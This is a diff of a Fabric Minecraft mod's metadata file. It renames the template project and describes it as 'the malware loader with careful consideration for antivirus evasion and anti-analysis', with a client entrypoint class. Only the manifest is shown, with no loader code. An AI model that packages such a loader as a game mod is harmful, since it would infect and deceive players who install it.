@@ -3,9 +3,9 @@
 	"id": "loader",
 	"version": "${version}",
 	"name": "loader",
-	"description": "This is an example description! Tell everyone what your mod is about!",
+	"description": "The malware loader with careful consideration for antivirus evasion and anti-analysis.\n",
 	"authors": [
-		"personage"
+		"SnipSnapz"
 	],
 	"contact": {
 		"homepage": "https://fabricmc.net/",
@@ -16,11 +16,10 @@
 	"environment": "*",
 	"entrypoints": {
 		"client": [
-			"com.example.Loader"
+			"sh.snipsnapz.Loader"
 		]
 	},
 	"mixins": [
-		"loader.mixins.json"
 	],
 	"depends": {
 		"fabricloader": ">=0.18.4",
